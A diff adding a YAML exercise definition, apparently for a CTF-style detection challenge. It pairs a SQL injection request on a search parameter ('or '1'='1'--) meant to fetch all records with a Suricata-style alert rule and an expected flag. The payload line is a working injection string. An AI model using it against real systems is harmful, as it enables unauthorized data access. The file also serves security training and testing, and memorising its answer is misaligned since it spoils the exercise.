@@ -1,0 +1,24 @@
+name: 'SQL Injection (Search)'
+type: 'exploit'
+
+text: |-
+  **Goal: Fetch all records**
+
+hints: []
+
+target:
+  dev:
+    host: localhost
+    port: 10006
+  prod:
+    host: detector
+    port: 80
+
+base_request: |-
+  GET /?search=nebula')+or+'1'='1'-- HTTP/1.1
+  Host: localhost
+
+rules:
+- 'alert http any any -> any any (msg:"%%ID%%"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'
+
+expected_output: "Flaggy flag"
